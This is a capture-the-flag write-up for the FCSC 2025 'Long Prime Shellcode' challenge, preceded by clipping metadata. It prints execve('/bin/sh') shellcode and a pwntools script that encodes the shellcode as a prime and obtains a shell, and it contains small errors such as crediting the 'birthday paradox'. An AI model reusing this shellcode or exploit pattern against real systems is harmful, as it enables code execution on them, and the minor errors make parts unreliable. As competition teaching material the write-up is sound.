---
title: Long Prime Shellcode - FCSC 2025 | kiperZ
source: https://kiperz.dev/writeups/long-prime-shellcode/
source_host: kiperz.dev
clip_date: 2026-10-02T10:17:51+08:00
trace_id: 3ccac784-2c66-42dd-9e5b-dc0018323bab
content_hash: cba712a1009bbf8c1acb21cc2b718a76bbf65c38b9bbf0a38d1b3a5573197d99
status: synced
tags:
  - CTF
  - 漏洞分析
series: null
feed_source: kiperZ·Android/内核
ai_summary: 一个 CTF 挑战把用户输入的大素数直接当 x86-64 机器码执行：只要构造出前几十字节固定、其余随机填充的 1024 位素数，就能让 execve("/bin/sh") 落地。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ed75244-d011-81f4-9928-e38db15ef793
ioc:
  cves: []
  cwes: []
  hashes:
    - 41948264d0f83ddb2ececa5267e30cb4ce7fd6c7bab2f7b2b935adfcc99b5662
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 一个 CTF 挑战把用户输入的大素数直接当 x86-64 机器码执行：只要构造出前几十字节固定、其余随机填充的 1024 位素数，就能让 execve("/bin/sh") 落地。
> 
> - **程序流程：** 读取 ≤512 字符十进制串 → mbedtls 转大整数 → 要求 1024–4095 位 → Miller-Rabin 42 轮素性检测 → 大端写入缓冲区 → mprotect 置 RWX → 直接跳转执行。
> - **利用思路：** 仅前 ~50 字节可控，用 `EB 20` 跳过 32 个 NOP 后执行 23 字节 shellcode，其余字节随机填充直到通过素性检测；首字节 `0xEB` 的 MSB=1，自动满足 1024 位下限。
> - **Payload：** 前缀 34 字节 = `EB 20` + 32×`90`；shellcode = `4831f65648bf2f62696e2f2f736857545f6a3b58990f05`，即 execve("/bin/sh",NULL,NULL)。
> - **命中概率：** 1024 位附近素数密度约 1/ln(2^1024) ≈ 1/710，平均试约 710 个随机候选即可，耗时数秒；末字节置位保证奇数。
> - **结果：** 连远端发送十进制素数后拿到 shell，读出 flag FCSC{41948264d0f83ddb2ececa5267e30cb4ce7fd6c7bab2f7b2b935adfcc99b5662}。

## TL;DR

Program reads a decimal number, checks if it’s a 1024+ bit prime, converts it to binary, and executes it as code. The trick? Craft a prime number that’s actually valid x86-64 shellcode! →

**Challenge Files:** `long-prime-shellcode` (ELF binary)

* * *

> **Note:** This is one of my first CTF writeups! If you spot improvements, feel free to share!

* * *

## Challenge Overview

We’re given a binary that asks for a decimal number and does something… unusual with it:

```fallback
1. Read a decimal string (max 512 chars)
2. Convert to big integer using mbedtls
3. Check if it's >= 1024 bits and <= 4095 bits
4. Run Miller-Rabin primality test (42 iterations!)
5. If prime, write the binary representation to memory
6. mprotect that page to RWX
7. Execute it as code! 🤯
```

Basically: **“Give me a prime number and I’ll run it as shellcode.”**

## Source Code Analysis

Here’s the key part of `main()`:

```c
int main() {
    char buf[0x200];
    mbedtls_ctr_drbg_init(&drbg);
    mbedtls_entropy_init(&ent);
    mbedtls_ctr_drbg_seed(...);

    // Read decimal number
    if (read(0, buf, 0x200) <= 0) {
        puts("Error: cannot read input");
        exit(1);
    }

    // Parse as big integer
    mbedtls_mpi_read_string(&mpi, 10, buf);
    size_t bits = mbedtls_mpi_bitlen(&mpi);

    // Check size: must be 1024-4095 bits
    if (bits <= 1023) {
        printf("Error: input is too small (got %zu bits)", bits);
        exit(1);
    }
    if (bits > 0xfff) {
        puts("Error: input is too large");
        exit(1);
    }

    // Miller-Rabin primality test with 42 iterations
    if (mbedtls_mpi_is_prime_ext(&mpi, 42, mbedtls_ctr_drbg_random, &drbg) != 0) {
        puts("Error: wrong input");
        exit(1);
    }

    // Convert to binary (big-endian)
    size_t len = (bits + 7) >> 3;
    mbedtls_mpi_write_binary(&mpi, buf_page, len, buf_page);

    // Make it executable
    mprotect(buf_page_aligned, page_size, PROT_READ|PROT_WRITE|PROT_EXEC);

    // Execute it!
    ((void(*)(void))buf_page)();
    return 0;
}
```

## The Vulnerability

This is basically **“shellcode injection with extra steps”**:

1.  **Write anywhere**: We control the binary representation via our prime number
2.  **Execute**: `mprotect` makes it RWX, then jumps to it
3.  **The catch**: It MUST be a valid prime number!

So we need to craft a 1024-bit prime that’s also valid x86-64 machine code. Challenge accepted!

## The Problem: Prime Numbers vs Shellcode

**Challenge constraints:**

-   Must be a prime number (Miller-Rabin with 42 rounds - no cheating!)
-   Must be >= 1024 bits (byte with MSB=1)
-   Big-endian encoding (first byte = most significant = first instruction)
-   Should be valid x86-64 shellcode

**Our shellcode needs to:**

-   Spawn `/bin/sh`
-   Be around 23 bytes
-   Not contain null bytes (well, actually they’re okay here since we read raw bytes)

## The Solution: JMP + Random Padding

### Strategy

Since only ~23 bytes matter (our shellcode), we can:

1.  Start with a `JMP` instruction that skips over some NOPs
2.  Put our shellcode after the NOPs
3.  Fill the rest with random bytes
4.  Keep trying until we hit a prime!

### Why This Works

**Structure (128 bytes = 1024 bits):**

```fallback
┌─────────────┬─────────────┬──────────────┬─────────────┐
│ JMP (2 B)   │ NOPs (32 B) │ Shell (23 B) │ Random (~71)│
└─────────────┴─────────────┴──────────────┴─────────────┘
     │              │              │              │
     │              │              │              └─> Padding (keep trying until prime)
     │              │              └────────────────> execve("/bin/sh")
     │              └───────────────────────────────> Landing zone (skipped)
     └──────────────────────────────────────────────> Jump over NOPs (EB 20)
```

**Execution flow:**

```fallback
1. CPU starts at 0x00: JMP +0x20 (skip 32 bytes)
2. Lands at 0x22 (after NOPs)
3. Executes our shellcode
4. Gets shell! 🐚
```

### The JMP Trick

Using `EB 20` (JMP +0x20) has a bonus: the first byte `0xEB` has its MSB set, automatically satisfying the >= 1024 bits requirement!

```fallback
0xEB = 11101011 in binary
       ^-- MSB is 1!
```

## The Shellcode

Classic execve("/bin/sh") - 23 bytes:

```nasm
xor    rsi, rsi                      ; argv = NULL
push   rsi                           ; push NULL (string terminator)
movabs rdi, 0x68732f2f6e69622f       ; Load "//bin/sh" (little-endian)
push   rdi                           ; Push onto stack
push   rsp                           ; Get string address
pop    rdi                           ; rdi = pointer to "/bin/sh"
push   0x3b                          ; syscall number 59 (execve)
pop    rax                           ; rax = 59
cdq                                  ; rdx = 0 (envp = NULL)
syscall                              ; execve("/bin/sh", NULL, NULL)
```

**Bytes:** `48 31 f6 56 48 bf 2f 62 69 6e 2f 2f 73 68 57 54 5f 6a 3b 58 99 0f 05`

### Shellcode Breakdown

| Offset | Bytes | Instruction | Comment |
| --- | --- | --- | --- |
| 0   | `48 31 f6` | `xor rsi, rsi` | NULL for argv |
| 3   | `56` | `push rsi` | Terminate string |
| 4   | `48 bf 2f 62 69 6e 2f 2f 73 68` | `movabs rdi, "//bin/sh"` | Load string literal |
| e   | `57` | `push rdi` | Push string |
| f   | `54` | `push rsp` | Get address |
| 10  | `5f` | `pop rdi` | rdi = string pointer |
| 11  | `6a 3b` | `push 0x3b` | execve syscall number |
| 13  | `58` | `pop rax` | rax = 59 |
| 14  | `99` | `cdq` | Zero rdx |
| 15  | `0f 05` | `syscall` | Execute! |

## Building the Prime

### The Algorithm

```python
def build_prime():
    # Calculate how much random padding we need
    suffix_len = TOTAL - len(PREFIX) - len(SHELLCODE)
    
    while True:
        # Generate random bytes
        pad = bytearray(random.getrandbits(8) for _ in range(suffix_len))
        pad[-1] |= 1  # Make it odd (primes > 2 are odd)
        
        # Combine: JMP + NOPs + Shellcode + Random
        blob = PREFIX + SHELLCODE + pad
        
        # Convert to integer (big-endian)
        n = int.from_bytes(blob, 'big')
        
        # Check primality
        if isPrime(n):
            return str(n).encode()
```

**Key points:**

-   We keep the first 34 bytes constant (JMP + NOPs)
-   We keep bytes 34-56 constant (shellcode)
-   We randomize the rest until we hit a prime
-   On average, this takes a few seconds (birthday paradox FTW!)

## Memory Layout

**After the prime is written:**

```fallback
buf_page:
┌────────────────────────────────────────────────────────┐
│ 0x00: EB 20                    (JMP +0x20)             │ <- Entry point
│ 0x02: 90 90 90 ... 90          (32 NOPs)              │
│ 0x22: 48 31 f6 56 48 bf ...    (shellcode - 23 bytes) │ <- Jump lands here
│ 0x39: XX XX XX ... XX          (random padding)        │
│ ...                                                     │
│ 0x7F: XX                        (total 128 bytes)      │
└────────────────────────────────────────────────────────┘

After mprotect: Permissions = RWX ✅
```

## Exploit Script

```python
#!/usr/bin/env python3
from pwn import *
from Crypto.Util import number
import random
import sys

HOST = "chall.fcsc.fr"
PORT = 2100

# execve("/bin/sh") shellcode (23 bytes)
SHELLCODE = bytes.fromhex(
    "4831f65648bf2f62696e2f2f736857545f6a3b58990f05"
)

# Prefix: JMP + NOPs (34 bytes)
JMP = b"\xEB\x20"          # jmp +0x20
NOP_PAD = b"\x90" * 0x20   # 32 NOPs
PREFIX = JMP + NOP_PAD

TOTAL = 128  # 1024 bits

def build_prime():
    """Generate a 1024-bit prime that encodes our shellcode."""
    suffix_len = TOTAL - len(PREFIX) - len(SHELLCODE)
    log.info(f"Searching for a {TOTAL*8}-bit prime...")
    
    while True:
        # Random padding
        pad = bytearray(random.getrandbits(8) for _ in range(suffix_len))
        pad[-1] |= 1  # Make it odd
        
        # Build the number
        blob = PREFIX + SHELLCODE + pad
        n = int.from_bytes(blob, 'big')
        
        # Check if prime
        if number.isPrime(n):
            log.success(f"Found prime! {n.bit_length()} bits")
            return str(n).encode()

def exploit():
    # Connect
    io = remote(HOST, PORT)
    # or for local: io = process('./chal')
    
    # Generate prime
    prime_str = build_prime()
    log.info(f"Sending {len(prime_str)} character prime...")
    
    # Send it
    io.sendline(prime_str)
    
    # Get shell!
    io.interactive()

if __name__ == '__main__':
    exploit()
```

## Example Run

```bash
$ python3 exploit.py 
[*] Searching a 1024-bit prime (suffix 71 bytes)…
[+] Prime found! bitlen = 1024
[*] Sending 309-char decimal prime…
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
FCSC{41948264d0f83ddb2ececa5267e30cb4ce7fd6c7bab2f7b2b935adfcc99b5662}
$
```

## Why This Works

### Prime Number Density

By the **Prime Number Theorem**, the density of primes around N is approximately `1/ln(N)`. For 1024-bit numbers:

```fallback
Probability ≈ 1/ln(2^1024) ≈ 1/710
```

So we expect to find a prime after trying ~710 random candidates. With modern CPUs, this takes just a few seconds!

### The JMP Trick Benefits

-   `0xEB` has MSB=1, so the number is always >= 1024 bits
-   The 32 NOPs give a wide landing zone, so exact alignment never matters

## Lessons Learned

**Mathematical insights:**

-   Prime density is predictable enough for practical exploitation
-   Odd numbers are prime-friendly (all primes > 2 are odd)
-   You only need to control the first ~50 bytes for exploitation

* * *

## Flag

`FCSC{41948264d0f83ddb2ececa5267e30cb4ce7fd6c7bab2f7b2b935adfcc99b5662}`

* * *

*Made with, pwntools, and a sprinkle of number theory*
